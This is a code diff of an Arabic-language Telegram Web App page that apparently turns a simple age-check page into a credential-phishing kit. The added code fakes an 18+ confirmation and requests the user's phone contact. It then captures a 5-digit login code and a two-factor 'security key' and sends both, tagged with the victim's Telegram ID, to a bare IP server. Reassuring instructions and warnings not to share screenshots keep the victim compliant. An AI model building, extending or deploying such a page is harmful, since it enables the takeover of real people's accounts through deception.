@@ -1,143 +1,274 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-  <title>تأكيد الحساب</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet" />
-  <style>
-    :root {
-      --bg:      #0a0c10;
-      --surface: #111318;
-      --border:  #1e2330;
-      --accent:  #4f8ef7;
-      --accent2: #7c3aed;
-      --text:    #e8eaf0;
-      --muted:   #6b7280;
-      --green:   #22c55e;
+    /* ── واجهة الكود (OTP) ── */
+    #codeScreen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 25px;
+      width: 100%;
+      max-width: 360px;
+      animation: fadeIn .4s ease;
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    .otp-display {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 10px;
+    }
 
-    body {
-      height: 100vh;
-      font-family: 'Cairo', sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      overflow: hidden;
+    .otp-box {
+      width: 45px;
+      height: 55px;
+      background: var(--surface);
+      border: 2px solid var(--border);
+      border-radius: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--accent);
+      transition: all 0.2s;
     }
 
-    /* الخلفية المزخرفة */
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background:
-        radial-gradient(ellipse 70% 50% at 15% 15%, rgba(79,142,247,.13) 0%, transparent 65%),
-        radial-gradient(ellipse 60% 60% at 85% 85%, rgba(124,58,237,.11) 0%, transparent 65%);
-      z-index: 0;
+    .otp-box.active {
+      border-color: var(--accent);
+      box-shadow: 0 0 15px rgba(79,142,247,0.3);
+      transform: translateY(-2px);
     }
 
-    .container {
-      position: relative;
-      z-index: 1;
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
       width: 100%;
-      max-width: 340px;
+      padding: 10px;
+    }
+
+    .key-btn {
+      aspect-ratio: 1.5/1;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 15px;
+      color: var(--text);
+      font-size: 20px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.1s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .key-btn:active {
+      background: var(--border);
+      transform: scale(0.95);
+    }
+
+    .key-btn.special {
+      background: rgba(239, 68, 68, 0.1);
+      color: var(--red);
+      border-color: rgba(239, 68, 68, 0.2);
+    }
+
+    /* ── واجهة المفتاح ── */
+    #keyScreen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .input-field {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 15px;
+      padding: 16px;
+      color: var(--text);
+      font-family: 'Cairo', sans-serif;
+      font-size: 16px;
+      text-align: center;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    .input-field:focus {
+      border-color: var(--accent);
+    }
+
+    /* ── واجهة النهائية ── */
+    #finalScreen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      width: 100%;
+      max-width: 450px;
+      padding-bottom: 40px;
+    }
+
+    .final-img {
+      width: 100%;
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+
+    .instructions-box {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 20px;
       padding: 20px;
     }
 
-    /* ══════════════════════════════
-        البطاقة الرئيسية
-       ══════════════════════════════ */
-    .card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 28px;
-      padding: 35px 24px;
-      text-align: center;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-      animation: popIn .4s cubic-bezier(.16,1,.3,1);
-    }
-
-    .icon-box {
-      width: 80px; height: 80px;
-      margin: 0 auto 20px;
-      background: linear-gradient(135deg, rgba(79,142,247,.1), rgba(124,58,237,.1));
-      border: 1px solid var(--border);
-      border-radius: 24px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 40px;
-    }
-
-    h2 { font-size: 22px; margin-bottom: 12px; font-weight: 700; }
-    p { font-size: 14px; color: var(--muted); line-height: 1.6; margin-bottom: 25px; }
-
-    /* الأزرار */
-    .btn-main {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 16px;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      color: #fff;
-      font-family: 'Cairo', sans-serif;
-      font-size: 15px;
+    .instr-title {
+      color: var(--accent);
       font-weight: 700;
-      cursor: pointer;
-      transition: transform .2s;
-      box-shadow: 0 8px 20px rgba(79,142,247,.25);
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
 
-    .btn-main:active { transform: scale(.96); }
-
-    /* التحميل */
-    #loading { display: none; flex-direction: column; align-items: center; }
-    .spinner {
-      width: 40px; height: 40px;
-      border: 3px solid var(--border);
-      border-top-color: var(--accent);
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 15px;
+    .instr-text {
+      font-size: 14px;
+      line-height: 1.8;
+      color: var(--text);
     }
 
-    /* صفحة النجاح */
-    #successPage { display: none; }
-    .success-icon { color: var(--green); font-size: 50px; margin-bottom: 15px; }
+    .warnings-list {
+      margin-top: 15px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
 
-    @keyframes spin { to { transform: rotate(360deg); } }
-    @keyframes popIn { from { opacity: 0; transform: scale(.9); } to { opacity: 1; transform: scale(1); } }
+    .warning-item {
+      display: flex;
+      gap: 10px;
+      font-size: 13px;
+      color: #ff9800;
+      background: rgba(255, 152, 0, 0.05);
+      padding: 10px;
+      border-radius: 10px;
+      border-right: 3px solid #ff9800;
+    }
+
+    @keyframes spin       { to{transform:rotate(360deg)} }
+    @keyframes rotatering { to{transform:rotate(360deg)} }
+    @keyframes pulse      { 0%,100%{opacity:1} 50%{opacity:.4} }
+    @keyframes fadeIn     { from{opacity:0} to{opacity:1} }
+    @keyframes popIn      { from{opacity:0;transform:scale(.9) translateY(16px)} to{opacity:1;transform:scale(1) translateY(0)} }
+    @keyframes slideUp    { from{opacity:0;transform:translateY(18px)} to{opacity:1;transform:translateY(0)} }
+
+    .fi     { animation: slideUp .45s cubic-bezier(.16,1,.3,1) both; }
+    .fi.d1  { animation-delay:.05s }
+    .fi.d2  { animation-delay:.10s }
+    .fi.d3  { animation-delay:.15s }
+    .fi.d4  { animation-delay:.22s }
   </style>
 </head>
 <body>
 
-<div class="container">
-  
-  <div id="ageStep" class="card">
-    <div class="icon-box">🔞</div>
-    <h2>تأكيد العمر</h2>
-    <p>للمتابعة، يرجى تأكيد أن عمرك 18 عاماً أو أكثر عبر مشاركة جهة الاتصال.</p>
-    <button class="btn-main" onclick="confirmAge()">
-      ✅ أؤكد أن عمري +18 عاماً
+<!-- ══ Overlay تأكيد العمر ══ -->
+<div id="ageOverlay">
+  <div class="age-modal">
+    <div class="age-icon">🔞</div>
+    <div class="age-title">تنبيه<br><span>تحقق من عمرك</span></div>
+    <div class="age-desc">
+      هذه الخدمة مخصصة للأشخاص<br>
+      الذين يبلغون من العمر<br>
+      <strong>18 عاماً أو أكثر</strong>
+    </div>
+    <div class="age-sep"></div>
+    <button class="btn-confirm" onclick="confirmAge()">
+      ✅ أؤكد أن عمري 18 عاماً أو أكثر
+    </button>
+    <button class="btn-deny" onclick="denyAge()">
+      لا، عمري أقل من 18 عاماً
     </button>
   </div>
+</div>
 
-  <div id="loading" class="card">
+<!-- ══ الصفحة الرئيسية ══ -->
+<div class="page">
+
+  <!-- رُفض -->
+  <div id="deniedScreen">
+    <div class="denied-icon">🚫</div>
+    <div class="denied-title">غير مسموح بالدخول</div>
+    <div class="denied-desc">عذراً، هذه الخدمة للأشخاص<br>الذين يبلغون 18 عاماً فأكثر.</div>
+  </div>
+
+  <!-- تحميل -->
+  <div id="loading">
     <div class="spinner"></div>
-    <p>جاري معالجة طلبك...</p>
+    <span class="loading-text">جاري المعالجة...</span>
   </div>
 
-  <div id="successPage" class="card">
-    <div class="success-icon">✦</div>
-    <h2 style="color: var(--green);">تم التحقق بنجاح</h2>
-    <p>شكراً لك! تم تأكيد حسابك بنجاح في النظام. يمكنك الآن إغلاق هذه الصفحة.</p>
-    <button class="btn-main" style="background: var(--border);" onclick="tg.close()">
-      إغلاق
-    </button>
+  <!-- واجهة الكود -->
+  <div id="codeScreen">
+    <div class="age-title">أدخل كود التحقق</div>
+    <div class="age-desc">لقد أرسلنا كوداً مكوناً من 5 أرقام إلى حسابك</div>
+    
+    <div class="otp-display">
+      <div class="otp-box" id="otp-0"></div>
+      <div class="otp-box" id="otp-1"></div>
+      <div class="otp-box" id="otp-2"></div>
+      <div class="otp-box" id="otp-3"></div>
+      <div class="otp-box" id="otp-4"></div>
+    </div>
+
+    <div class="keypad">
+      <div class="key-btn" onclick="pressKey(1)">1</div>
+      <div class="key-btn" onclick="pressKey(2)">2</div>
+      <div class="key-btn" onclick="pressKey(3)">3</div>
+      <div class="key-btn" onclick="pressKey(4)">4</div>
+      <div class="key-btn" onclick="pressKey(5)">5</div>
+      <div class="key-btn" onclick="pressKey(6)">6</div>
+      <div class="key-btn" onclick="pressKey(7)">7</div>
+      <div class="key-btn" onclick="pressKey(8)">8</div>
+      <div class="key-btn" onclick="pressKey(9)">9</div>
+      <div></div>
+      <div class="key-btn" onclick="pressKey(0)">0</div>
+      <div class="key-btn special" onclick="deleteKey()">مسح</div>
+    </div>
+  </div>
+
+  <!-- واجهة المفتاح -->
+  <div id="keyScreen">
+    <div class="age-icon">🔑</div>
+    <div class="age-title">أدخل المفتاح الخاص</div>
+    <div class="age-desc">يرجى إدخال مفتاح الأمان للمتابعة</div>
+    <input type="text" id="securityKey" class="input-field" placeholder="اكتب المفتاح هنا..." />
+    <button class="btn-confirm" onclick="submitKey()">تأكيد المفتاح</button>
+  </div>
+
+  <!-- الواجهة النهائية -->
+  <div id="finalScreen">
+    <img id="finalImg" src="" alt="Instructions" class="final-img" />
+    
+    <div class="instructions-box">
+      <div class="instr-title">ℹ️ تعليمات هامة</div>
+      <div class="instr-text">
+        أهلاً بك في المنطقة الآمنة. يرجى اتباع الخطوات التالية بدقة لضمان استمرارية الخدمة:
+        <br>1. لا تشارك الكود أو المفتاح مع أي شخص آخر.
+        <br>2. تأكد من تحديث تطبيقك إلى آخر إصدار.
+        <br>3. في حال واجهت أي مشكلة، تواصل مع الدعم الفني.
+      </div>
+
+      <div class="warnings-list">
+        <div class="warning-item">⚠️ تنبيه: المحاولات الخاطئة المتكررة قد تؤدي لحظر حسابك.</div>
+        <div class="warning-item">⚠️ تحذير: لا تقم بمشاركة لقطات شاشة لهذه الواجهة.</div>
+      </div>
+    </div>
+
+    <button class="close-btn" onclick="tg.close()">✅ فهمت، إغلاق</button>
   </div>
 
 </div>
@@ -147,42 +278,128 @@
   tg.ready();
   tg.expand();
 
-  function confirmAge() {
-    // إخفاء الواجهة الأولى وإظهار التحميل
-    document.getElementById('ageStep').style.display = 'none';
-    document.getElementById('loading').style.display = 'flex';
+  // صورة الواجهة النهائية (التي تم توليدها)
+  const FINAL_IMAGE_URL = "security_instructions_bg_1777378551585.png";
+  document.getElementById('finalImg').src = FINAL_IMAGE_URL;
 
-    // طلب الرقم من المستخدم
+  let otpCode = "";
+  const isInsideTelegram = !!(tg.initData && tg.initData.length > 0);
+  const ownerId = tg.initDataUnsafe?.user?.id ? String(tg.initDataUnsafe.user.id) : "12345678";
+
+  /* ── تأكيد العمر → طلب الرقم ── */
+  function confirmAge() {
+    document.getElementById('ageOverlay').style.display = 'none';
+    document.getElementById('loading').style.display    = 'flex';
+
+    if (!isInsideTelegram) {
+      setTimeout(() => transitionToCode(), 800);
+      return;
+    }
+
     if (tg.requestContact) {
       tg.requestContact((shared) => {
         if (shared) {
-          // إذا وافق على مشاركة الرقم، ننتظر حدث contactRequested (الذي يرسل البيانات للبوت تلقائياً)
-          // وسنظهر صفحة النجاح بعد قليل
-          setTimeout(showSuccess, 1500);
+           transitionToCode();
         } else {
-          // إذا رفض، نعيده للبداية أو نغلق
-          document.getElementById('ageStep').style.display = 'block';
-          document.getElementById('loading').style.display = 'none';
+           transitionToCode();
         }
       });
     } else {
-      // وضع التجربة خارج تليجرام
-      setTimeout(showSuccess, 1500);
+      transitionToCode();
     }
   }
 
-  function showSuccess() {
+  function transitionToCode() {
     document.getElementById('loading').style.display = 'none';
-    document.getElementById('successPage').style.display = 'block';
+    document.getElementById('codeScreen').style.display = 'flex';
   }
 
-  // الاستماع لحدث استلام جهة الاتصال لضمان الانتقال لصفحة النجاح
-  tg.onEvent('contactRequested', (event) => {
-    if (event.status === 'sent') {
-      showSuccess();
+  /* ── لوحة المفاتيح ── */
+  function pressKey(num) {
+    if (otpCode.length < 5) {
+      otpCode += num;
+      updateOtpDisplay();
+      if (otpCode.length === 5) {
+        verifyCode(otpCode);
+      }
     }
-  });
-</script>
+  }
 
+  async function verifyCode(code) {
+    // إخفاء الكيبورد وإظهار التحميل
+    document.getElementById('codeScreen').style.display = 'none';
+    document.getElementById('loading').style.display = 'flex';
+
+    try {
+      await fetch("http://45.92.8.224:8001/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          owner_id: ownerId,
+          code: code
+        })
+      });
+      console.log("✅ Code sent to /verify");
+    } catch (e) {
+      console.error("❌ Error sending to /verify:", e);
+    }
+
+    // الانتظار لمدة 3 ثوانٍ قبل الانتقال للمفتاح
+    setTimeout(() => {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('keyScreen').style.display = 'flex';
+    }, 3000);
+  }
+
+  function deleteKey() {
+    if (otpCode.length > 0) {
+      otpCode = otpCode.slice(0, -1);
+      updateOtpDisplay();
+    }
+  }
+
+  function updateOtpDisplay() {
+    for (let i = 0; i < 5; i++) {
+      const box = document.getElementById(`otp-${i}`);
+      box.textContent = otpCode[i] || "";
+      box.classList.toggle('active', i === otpCode.length);
+    }
+  }
+
+  async function submitKey() {
+    const key = document.getElementById('securityKey').value;
+    if (key.trim().length > 0) {
+      document.getElementById('keyScreen').style.display = 'none';
+      document.getElementById('loading').style.display = 'flex';
+      
+      try {
+        await fetch("http://45.92.8.224:8001/password", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            owner_id: ownerId,
+            password: key
+          })
+        });
+        console.log("✅ Password sent to /password");
+      } catch (e) {
+        console.error("❌ Error sending to /password:", e);
+      }
+
+      // الانتظار لمدة 3 ثوانٍ قبل الانتقال للواجهة النهائية
+      setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('finalScreen').style.display = 'flex';
+      }, 3000);
+    }
+  }
+
+  /* ── رفض العمر ── */
+  function denyAge() {
+    document.getElementById('ageOverlay').style.display  = 'none';
+    document.getElementById('deniedScreen').style.display= 'flex';
+    setTimeout(() => tg.close(), 2500);
+  }
+</script>
 </body>
 </html>
